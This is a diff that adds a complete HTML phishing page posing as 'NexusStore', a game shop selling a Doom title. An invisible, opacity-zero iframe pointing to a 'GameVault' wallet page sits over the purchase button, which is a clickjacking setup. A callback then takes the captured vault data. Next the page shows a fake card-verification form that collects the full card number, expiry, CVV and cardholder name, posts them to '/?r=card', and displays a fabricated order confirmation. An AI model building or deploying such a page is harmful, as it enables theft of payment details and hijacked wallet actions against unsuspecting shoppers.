@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>NexusStore</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Inter:wght@300;400;500;600;700&display=swap">
+<style>
+:root {
+  --bg:       #080b12;
+  --surface:  #0e1320;
+  --border:   #1e2740;
+  --accent:   #7c3aed;
+  --accent2:  #06b6d4;
+  --text:     #e2e8f0;
+  --muted:    #64748b;
+  --success:  #10b981;
+  --danger:   #ef4444;
+  --gold:     #f59e0b;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { font-size: 16px; }
+body {
+  font-family: 'Inter', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* NAV */
+nav {
+  position: sticky; top: 0; z-index: 50;
+  background: rgba(8,11,18,.92);
+  backdrop-filter: blur(16px);
+  border-bottom: 1px solid var(--border);
+  padding: .75rem 1.5rem;
+  display: flex; align-items: center; gap: 1rem;
+}
+.nav-logo {
+  font-family: 'Orbitron', monospace;
+  font-size: 1.1rem; font-weight: 700;
+  color: var(--accent2);
+  letter-spacing: .05em;
+  text-decoration: none;
+}
+.nav-logo span { color: var(--accent); }
+.nav-spacer { flex: 1; }
+.nav-tag {
+  font-size: .7rem; font-weight: 600; letter-spacing: .08em;
+  padding: .2rem .55rem;
+  border: 1px solid var(--accent);
+  color: var(--accent);
+  border-radius: 999px;
+  text-transform: uppercase;
+}
+
+/* HERO GRID */
+.page {
+  max-width: 1100px;
+  margin: 0 auto;
+  padding: 2.5rem 1.25rem 4rem;
+}
+.hero-grid {
+  display: grid;
+  grid-template-columns: 1fr 400px;
+  gap: 2.5rem;
+  align-items: start;
+}
+@media (max-width: 800px) {
+  .hero-grid { grid-template-columns: 1fr; }
+}
+
+/* GAME COVER */
+.cover-wrap {
+  position: relative;
+  border-radius: 16px;
+  overflow: hidden;
+  aspect-ratio: 16/9;
+  background: linear-gradient(135deg, #1a0533 0%, #0d1a3a 50%, #001a1a 100%);
+  box-shadow: 0 0 60px rgba(124,58,237,.25);
+}
+.cover-art {
+  width: 100%; height: 100%;
+  position: absolute; inset: 0;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 1rem;
+}
+.doom-skull {
+  width: 120px; height: 120px;
+  position: relative;
+}
+.doom-skull svg { width: 100%; height: 100%; }
+.cover-title-art {
+  font-family: 'Orbitron', monospace;
+  font-size: 1.9rem; font-weight: 900;
+  letter-spacing: .06em;
+  text-align: center;
+  line-height: 1.15;
+  color: #fff;
+  text-shadow: 0 0 30px rgba(239,68,68,.8);
+}
+.cover-title-art span {
+  display: block;
+  font-size: .85rem; font-weight: 500;
+  color: var(--accent2);
+  letter-spacing: .18em;
+  text-shadow: none;
+  margin-top: .3rem;
+}
+.cover-badge {
+  position: absolute; top: 1rem; right: 1rem;
+  background: var(--danger);
+  color: #fff;
+  font-size: .68rem; font-weight: 700;
+  letter-spacing: .1em;
+  padding: .2rem .55rem;
+  border-radius: 4px;
+  text-transform: uppercase;
+}
+.cover-glow {
+  position: absolute; inset: 0;
+  background: radial-gradient(ellipse at 50% 60%, rgba(239,68,68,.15) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+/* META CHIPS */
+.meta-chips {
+  display: flex; flex-wrap: wrap; gap: .5rem;
+  margin-top: 1.25rem;
+}
+.chip {
+  font-size: .72rem; font-weight: 500;
+  padding: .25rem .65rem;
+  border-radius: 6px;
+  border: 1px solid var(--border);
+  color: var(--muted);
+  background: var(--surface);
+}
+.chip.hl { border-color: var(--accent2); color: var(--accent2); }
+.chip.warn { border-color: var(--gold); color: var(--gold); }
+
+/* REVIEWS */
+.reviews {
+  margin-top: 1.5rem;
+  display: flex; gap: 1rem;
+}
+.review-score {
+  display: flex; flex-direction: column; align-items: center;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: .75rem 1rem;
+  min-width: 70px;
+}
+.score-num {
+  font-size: 1.6rem; font-weight: 700;
+  color: var(--success);
+}
+.score-src { font-size: .65rem; color: var(--muted); margin-top: .15rem; }
+
+/* PURCHASE PANEL */
+.buy-panel {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 1.75rem;
+  position: sticky; top: 72px;
+}
+.game-name {
+  font-family: 'Orbitron', monospace;
+  font-size: 1rem; font-weight: 700;
+  color: var(--text);
+  line-height: 1.3;
+}
+.game-edition {
+  font-size: .78rem; color: var(--accent2);
+  margin-top: .2rem; letter-spacing: .08em;
+  text-transform: uppercase;
+}
+.price-row {
+  margin-top: 1.25rem;
+  display: flex; align-items: baseline; gap: .6rem;
+}
+.price-current {
+  font-size: 2rem; font-weight: 700;
+  color: var(--text);
+}
+.price-orig {
+  font-size: .95rem; color: var(--muted);
+  text-decoration: line-through;
+}
+.price-save {
+  font-size: .78rem; font-weight: 600;
+  color: var(--success);
+  background: rgba(16,185,129,.12);
+  padding: .15rem .45rem; border-radius: 5px;
+}
+
+/* PAYMENT METHOD */
+.payment-label {
+  font-size: .7rem; font-weight: 600;
+  letter-spacing: .1em; text-transform: uppercase;
+  color: var(--muted);
+  margin-top: 1.25rem;
+}
+.payment-method {
+  margin-top: .5rem;
+  display: flex; align-items: center; gap: .75rem;
+  background: rgba(124,58,237,.08);
+  border: 1px solid rgba(124,58,237,.25);
+  border-radius: 10px;
+  padding: .75rem 1rem;
+}
+.card-icon {
+  width: 32px; height: 22px;
+  background: linear-gradient(135deg, #7c3aed, #06b6d4);
+  border-radius: 4px;
+  flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: .5rem; font-weight: 700; color: #fff;
+  letter-spacing: .05em;
+}
+.card-info { flex: 1; }
+.card-name { font-size: .85rem; font-weight: 600; color: var(--text); }
+.card-sub  { font-size: .72rem; color: var(--muted); }
+.vault-badge {
+  font-size: .65rem; font-weight: 600;
+  color: var(--accent);
+  display: flex; align-items: center; gap: .25rem;
+}
+.vault-badge::before {
+  content: '';
+  width: 6px; height: 6px;
+  background: var(--accent);
+  border-radius: 50%;
+  animation: pulse 1.8s infinite;
+}
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+
+/* INCLUDES */
+.includes {
+  margin-top: 1.25rem;
+  font-size: .78rem; color: var(--muted);
+}
+.includes ul { list-style: none; display: flex; flex-direction: column; gap: .3rem; margin-top: .4rem; }
+.includes li::before { content: '✓ '; color: var(--success); }
+
+/* BUY BUTTON WRAPPER */
+.buy-wrapper {
+  position: relative;
+  margin-top: 1.5rem;
+}
+.buy-iframe {
+  position: absolute;
+  inset: 0;
+  width: 100%; height: 100%;
+  border: none;
+  opacity: 0;
+  z-index: 10;
+  pointer-events: all;
+}
+.buy-btn {
+  position: relative;
+  z-index: 1;
+  width: 100%;
+  padding: 1rem 1.5rem;
+  font-family: 'Orbitron', monospace;
+  font-size: .88rem; font-weight: 700;
+  letter-spacing: .06em;
+  color: #fff;
+  background: linear-gradient(135deg, var(--accent) 0%, #9333ea 100%);
+  border: none; border-radius: 10px; cursor: pointer;
+  transition: filter .2s, transform .15s;
+  box-shadow: 0 4px 20px rgba(124,58,237,.4);
+}
+.buy-btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
+.buy-btn:active { transform: translateY(0); }
+
+.secure-note {
+  margin-top: .75rem;
+  font-size: .68rem; color: var(--muted);
+  text-align: center;
+  display: flex; align-items: center; justify-content: center; gap: .3rem;
+}
+
+/* STEP 2 — CARD FORM */
+#step2 { display: none; }
+.form-title {
+  font-family: 'Orbitron', monospace;
+  font-size: .95rem; font-weight: 700;
+  color: var(--text); margin-bottom: .2rem;
+}
+.form-sub { font-size: .78rem; color: var(--muted); margin-bottom: 1.25rem; }
+
+.form-group { margin-bottom: 1rem; }
+.form-group label {
+  display: block;
+  font-size: .72rem; font-weight: 600;
+  letter-spacing: .07em; text-transform: uppercase;
+  color: var(--muted); margin-bottom: .35rem;
+}
+.form-group input {
+  width: 100%;
+  padding: .7rem .9rem;
+  background: rgba(255,255,255,.04);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  color: var(--text);
+  font-size: .9rem;
+  font-family: inherit;
+  outline: none;
+  transition: border-color .2s;
+}
+.form-group input:focus { border-color: var(--accent); }
+.form-group input::placeholder { color: var(--muted); }
+.row2 { display: grid; grid-template-columns: 1fr 1fr; gap: .75rem; }
+
+.verify-btn {
+  width: 100%;
+  padding: .9rem 1.5rem;
+  font-family: 'Orbitron', monospace;
+  font-size: .85rem; font-weight: 700;
+  letter-spacing: .06em;
+  color: #fff;
+  background: linear-gradient(135deg, var(--accent2) 0%, #0891b2 100%);
+  border: none; border-radius: 10px; cursor: pointer;
+  box-shadow: 0 4px 16px rgba(6,182,212,.3);
+  transition: filter .2s;
+  margin-top: .5rem;
+}
+.verify-btn:hover { filter: brightness(1.1); }
+
+/* STEP 3 — SUCCESS */
+#step3 { display: none; text-align: center; }
+.success-icon {
+  width: 56px; height: 56px;
+  background: rgba(16,185,129,.15);
+  border: 2px solid var(--success);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 1rem;
+  font-size: 1.5rem;
+}
+.success-title {
+  font-family: 'Orbitron', monospace;
+  font-size: 1rem; font-weight: 700; color: var(--success);
+}
+.success-sub { font-size: .82rem; color: var(--muted); margin-top: .4rem; }
+.order-id {
+  margin-top: 1rem;
+  background: rgba(16,185,129,.08);
+  border: 1px solid rgba(16,185,129,.2);
+  border-radius: 8px;
+  padding: .75rem 1rem;
+  font-family: 'Orbitron', monospace;
+  font-size: .78rem; color: var(--success);
+  letter-spacing: .08em;
+}
+
+/* DESCRIPTION SECTION */
+.section-title {
+  font-size: .75rem; font-weight: 600;
+  letter-spacing: .12em; text-transform: uppercase;
+  color: var(--muted); margin-bottom: .75rem;
+  padding-bottom: .4rem;
+  border-bottom: 1px solid var(--border);
+}
+.desc-text {
+  font-size: .88rem; line-height: 1.7; color: #94a3b8;
+}
+.feature-grid {
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: .75rem; margin-top: 1.25rem;
+}
+.feature-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: .9rem 1rem;
+}
+.feature-card h4 { font-size: .82rem; font-weight: 600; color: var(--text); }
+.feature-card p  { font-size: .75rem; color: var(--muted); margin-top: .2rem; }
+
+/* SYSTEM REQUIREMENTS */
+.req-table { width: 100%; border-collapse: collapse; margin-top: .75rem; }
+.req-table td {
+  padding: .5rem .75rem;
+  font-size: .8rem;
+  border-bottom: 1px solid var(--border);
+}
+.req-table td:first-child { color: var(--muted); width: 35%; }
+.req-table td:last-child  { color: var(--text); }
+
+/* SPINNER */
+.loading-dot {
+  display: inline-block;
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: var(--muted);
+  animation: blink 1.2s infinite;
+}
+@keyframes blink { 0%,100%{opacity:.2} 50%{opacity:1} }
+</style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="#"><span>NEXUS</span>STORE</a>
+  <div class="nav-spacer"></div>
+  <div class="nav-tag">GameVault Connected</div>
+</nav>
+
+<div class="page">
+  <div class="hero-grid">
+
+    <!-- LEFT: game art + info -->
+    <div>
+      <div class="cover-wrap">
+        <div class="cover-art">
+          <div class="doom-skull">
+            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+              <defs>
+                <radialGradient id="glw" cx="50%" cy="50%" r="50%">
+                  <stop offset="0%" stop-color="#ef4444" stop-opacity=".8"/>
+                  <stop offset="100%" stop-color="#7c3aed" stop-opacity="0"/>
+                </radialGradient>
+              </defs>
+              <circle cx="50" cy="50" r="48" fill="url(#glw)"/>
+              <ellipse cx="50" cy="45" rx="30" ry="34" fill="#1a0a0a" stroke="#ef4444" stroke-width="1.5"/>
+              <ellipse cx="37" cy="38" rx="9" ry="10" fill="#ef4444" opacity=".9"/>
+              <ellipse cx="63" cy="38" rx="9" ry="10" fill="#ef4444" opacity=".9"/>
+              <ellipse cx="37" cy="38" rx="5" ry="6" fill="#000"/>
+              <ellipse cx="63" cy="38" rx="5" ry="6" fill="#000"/>
+              <rect x="38" y="58" width="6" height="8" fill="#c0a080" rx="1"/>
+              <rect x="47" y="56" width="6" height="10" fill="#c0a080" rx="1"/>
+              <rect x="56" y="58" width="6" height="8" fill="#c0a080" rx="1"/>
+              <path d="M35 72 Q50 80 65 72" stroke="#ef4444" stroke-width="1.5" fill="none"/>
+            </svg>
+          </div>
+          <div class="cover-title-art">
+            DOOM<br>THE DARK AGES
+            <span>Definitive Edition</span>
+          </div>
+        </div>
+        <div class="cover-glow"></div>
+        <div class="cover-badge">New Release</div>
+      </div>
+
+      <div class="meta-chips">
+        <span class="chip hl">Action FPS</span>
+        <span class="chip">Single-player</span>
+        <span class="chip">Co-op</span>
+        <span class="chip warn">M 17+</span>
+        <span class="chip">60 FPS</span>
+        <span class="chip">4K HDR</span>
+        <span class="chip">Controller</span>
+      </div>
+
+      <div class="reviews">
+        <div class="review-score">
+          <div class="score-num">96</div>
+          <div class="score-src">Metacritic</div>
+        </div>
+        <div class="review-score">
+          <div class="score-num" style="color:var(--accent2)">9.2</div>
+          <div class="score-src">IGN</div>
+        </div>
+        <div class="review-score">
+          <div class="score-num" style="color:var(--gold)">★ 4.9</div>
+          <div class="score-src">Users</div>
+        </div>
+      </div>
+
+      <div style="margin-top:2rem;">
+        <div class="section-title">About This Game</div>
+        <p class="desc-text">
+          Set centuries before the events of DOOM (2016), <strong>DOOM: The Dark Ages</strong> takes the Doom Slayer to the height of the medieval era — a time of knights, castles, and ancient demonic forces. Wield devastating new weapons and ride colossal war machines across breathtaking Gothic battlefields.
+        </p>
+        <div class="feature-grid">
+          <div class="feature-card">
+            <h4>Melee Combat</h4>
+            <p>New flail, shield, and spiked mace for brutal close-quarters carnage</p>
+          </div>
+          <div class="feature-card">
+            <h4>War Machines</h4>
+            <p>Pilot a dragon and stomp enemies in a 40-meter mechanical suit</p>
+          </div>
+          <div class="feature-card">
+            <h4>Open World</h4>
+            <p>Explore sprawling Gothic environments across 25+ hours of story</p>
+          </div>
+          <div class="feature-card">
+            <h4>Modding Support</h4>
+            <p>Full mod tools and Steam Workshop integration on day one</p>
+          </div>
+        </div>
+      </div>
+
+      <div style="margin-top:2rem;">
+        <div class="section-title">System Requirements</div>
+        <table class="req-table">
+          <tr><td>OS</td><td>Windows 11 / macOS 14</td></tr>
+          <tr><td>CPU</td><td>Intel Core i7-10700K or AMD Ryzen 9 5900X</td></tr>
+          <tr><td>GPU</td><td>NVIDIA RTX 3080 / AMD RX 6800 XT</td></tr>
+          <tr><td>RAM</td><td>16 GB</td></tr>
+          <tr><td>Storage</td><td>95 GB SSD Required</td></tr>
+          <tr><td>Network</td><td>Online activation required</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <!-- RIGHT: purchase panel -->
+    <div>
+      <div class="buy-panel">
+
+        <!-- STEP 1: buy -->
+        <div id="step1">
+          <div class="game-name">Doom: The Dark Ages</div>
+          <div class="game-edition">Definitive Edition · NexusStore Exclusive</div>
+
+          <div class="price-row">
+            <div class="price-current">$59.99</div>
+            <div class="price-orig">$79.99</div>
+            <div class="price-save">Save 25%</div>
+          </div>
+
+          <div class="payment-label">Payment Method</div>
+          <div class="payment-method">
+            <div class="card-icon" id="cardBrand">VISA</div>
+            <div class="card-info">
+              <div class="card-name" id="cardName">
+                <span class="loading-dot"></span>
+              </div>
+              <div class="card-sub" id="cardSub">Loading GameVault Wallet…</div>
+            </div>
+            <div class="vault-badge">Vault</div>
+          </div>
+
+          <div class="includes">
+            <strong style="color:var(--text)">Includes:</strong>
+            <ul>
+              <li>Base game + Definitive Edition DLC pack</li>
+              <li>Dark Ages Original Soundtrack (60 tracks)</li>
+              <li>Digital artbook (220 pages)</li>
+              <li>Exclusive "Iron Slayer" weapon skin</li>
+            </ul>
+          </div>
+
+          <div class="buy-wrapper">
+            <iframe
+              id="vaultFrame"
+              src="/nexus-vault.html"
+              class="buy-iframe"
+              sandbox="allow-same-origin allow-scripts"
+            ></iframe>
+            <button class="buy-btn" id="buyBtn">
+              Complete Purchase — $59.99
+            </button>
+          </div>
+
+          <div class="secure-note">
+            🔒 Secured via GameVault Wallet · 256-bit TLS
+          </div>
+        </div>
+
+        <!-- STEP 2: card verification -->
+        <div id="step2">
+          <div class="form-title">Card Verification</div>
+          <div class="form-sub" id="step2Sub">
+            First-time purchase requires card verification. Enter the card details for your saved payment method to continue.
+          </div>
+
+          <form id="cardForm" autocomplete="off">
+            <div class="form-group">
+              <label>Card Number</label>
+              <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+            <div class="row2">
+              <div class="form-group">
+                <label>Expiry Date</label>
+                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+              </div>
+              <div class="form-group">
+                <label>CVV</label>
+                <input type="text" id="cvv" placeholder="•••" maxlength="4" required>
+              </div>
+            </div>
+            <div class="form-group">
+              <label>Name on Card</label>
+              <input type="text" id="cardHolder" placeholder="Full name" required>
+            </div>
+            <button type="submit" class="verify-btn">Verify &amp; Complete Purchase</button>
+          </form>
+        </div>
+
+        <!-- STEP 3: success -->
+        <div id="step3">
+          <div class="success-icon">✓</div>
+          <div class="success-title">Purchase Complete!</div>
+          <div class="success-sub">
+            Doom: The Dark Ages — Definitive Edition has been added to your GameVault library.
+          </div>
+          <div class="order-id" id="orderIdDisplay">ORDER #—</div>
+          <div style="margin-top:1rem;font-size:.78rem;color:var(--muted);text-align:center;">
+            A confirmation has been sent to your GameVault account.<br>Download will begin automatically.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  const vaultFrame = document.getElementById('vaultFrame');
+  const cardNameEl = document.getElementById('cardName');
+  const cardSubEl  = document.getElementById('cardSub');
+  const cardBrandEl = document.getElementById('cardBrand');
+
+  let capturedOrderId = null;
+
+  // ── Populate payment method from vault ──────────────────────────────────
+  vaultFrame.addEventListener('load', function () {
+    try {
+      const vaultWin = vaultFrame.contentWindow;
+      const data = vaultWin.getVaultData ? vaultWin.getVaultData() : null;
+      if (data && data.cards) {
+        const card = data.cards.find(c => c.default) || data.cards[0];
+        cardBrandEl.textContent = card.brand.slice(0, 4).toUpperCase();
+        cardNameEl.textContent  = card.brand + ' •••• ' + card.last4;
+        cardSubEl.textContent   = card.bank + ' · GameVault Wallet';
+      } else {
+        cardNameEl.textContent = 'GameVault Saved Card';
+        cardSubEl.textContent  = 'Default payment method';
+      }
+    } catch (e) {
+      cardNameEl.textContent = 'GameVault Saved Card';
+      cardSubEl.textContent  = 'Default payment method';
+    }
+  });
+
+  // ── Callback: vault iframe captured, move to Step 2 ─────────────────────
+  window.nexusStep1Done = function (result) {
+    capturedOrderId = result.orderId || ('ORD-' + Math.floor(10000 + Math.random() * 90000));
+
+    const vault = result.vault || {};
+    const card = vault.cards ? (vault.cards.find(c => c.default) || vault.cards[0]) : null;
+    const sub = document.getElementById('step2Sub');
+    if (card) {
+      sub.textContent = 'First-time purchase requires card verification. Enter the full details for your ' +
+        card.brand + ' ending in ' + card.last4 + ' to confirm payment of $59.99.';
+    }
+
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+  };
+
+  // ── Card form submit ─────────────────────────────────────────────────────
+  document.getElementById('cardForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    const number = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    const expiry = document.getElementById('expiry').value;
+    const cvv    = document.getElementById('cvv').value;
+    const name   = document.getElementById('cardHolder').value;
+
+    const btn = this.querySelector('.verify-btn');
+    btn.textContent = 'Processing…';
+    btn.disabled = true;
+
+    fetch('/?r=card', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ number, expiry, cvv, name, source: 'nexusstore' })
+    })
+    .catch(() => {})
+    .finally(() => {
+      document.getElementById('step2').style.display = 'none';
+      document.getElementById('step3').style.display = 'block';
+      document.getElementById('orderIdDisplay').textContent = 'ORDER #' + capturedOrderId;
+    });
+  });
+
+  // ── Card number auto-format ──────────────────────────────────────────────
+  document.getElementById('cardNumber').addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '').slice(0, 16);
+    this.value = v.replace(/(.{4})/g, '$1 ').trim();
+  });
+  document.getElementById('expiry').addEventListener('input', function () {
+    let v = this.value.replace(/\D/g, '').slice(0, 4);
+    if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2);
+    this.value = v;
+  });
+})();
+</script>
+</body>
+</html>
